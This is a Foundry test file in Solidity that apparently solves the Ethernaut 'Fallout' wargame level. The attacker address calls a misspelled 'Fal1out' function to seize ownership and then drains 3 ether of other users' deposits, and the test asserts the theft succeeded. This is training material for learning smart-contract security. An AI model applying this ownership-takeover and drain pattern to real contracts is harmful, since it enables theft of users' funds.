// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { Fallout } from "../src/Fallout/Fallout.sol";

contract FalloutTest is Test {
    Fallout fallout;

    address h3x0r = vm.addr(1337);
    address deployer = vm.addr(1);
    address alice = vm.addr(2);
    address bella = vm.addr(3);

    function setUp() public {
        vm.prank(deployer);
        fallout = new Fallout();
        deal(h3x0r, 1 ether);

        assertEq(fallout.owner(), address(0x0));

        hoax(alice, 1 ether);
        fallout.allocate{value: 1 ether}();
        assertEq(fallout.allocatorBalance(alice), 1 ether);

        hoax(bella, 2 ether);
        fallout.allocate{value: 2 ether}();
        assertEq(fallout.allocatorBalance(bella), 2 ether);


        emit log_named_uint(
            "contract balance before attack",
            address(fallout).balance
        );
        emit log_named_uint(
            "h3x0r balance before attack",
            h3x0r.balance
        );
        assertEq(address(fallout).balance, 3 ether);
    }

    function testFalloutSubmit() internal {
        assertEq(fallout.owner(), h3x0r);
        emit log_named_uint(
            "contract balance after attack",
            address(fallout).balance
        );
        emit log_named_uint(
            "h3x0r balance after attack",
            h3x0r.balance
        );
        assertEq(h3x0r.balance, 4 ether);
    }
        
    function testFalloutHack() public {
        vm.startPrank(h3x0r);

        fallout.Fal1out{value: 1 wei}();
        fallout.collectAllocations();

        testFalloutSubmit();
    }
}